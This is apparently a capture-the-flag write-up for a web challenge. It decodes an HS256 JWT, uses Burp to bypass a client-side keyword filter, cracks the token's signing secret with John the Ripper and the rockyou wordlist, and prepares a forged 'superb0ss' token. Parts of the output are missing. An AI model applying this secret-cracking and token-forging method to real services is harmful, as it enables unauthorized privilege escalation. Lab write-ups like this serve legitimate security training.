## Solution

Analyzing tha site we fount in the request Header that the site uses `JWT`

```
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.jcBjGaU-N9koHQvZ8mYKmNi5B-QNmCTejbSUUsodkDw

From Base64 -> {"typ":"JWT","alg":"HS256"}{"role":"user"}
```

In the `chatbot.js` we also found that the string `allroles` is filtered out before the request is sent, let's try intercept end edit the request using Burp

```
text=allroles
```

We get this in respose

Let's now try to crack the `HS256`, and recreate that authorization using `superb0ss`

```console
$john --wordlist=./rockyou.txt temp
Created directory: /home/tiz314/snap/john-the-ripper/459/.john
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])

Press 'q' or Ctrl-C to abort, almost any other key for status

Use the "--show" option to display all of the cracked passwords reliably

The key is `chicken`

Let's send a request with this new authorization token
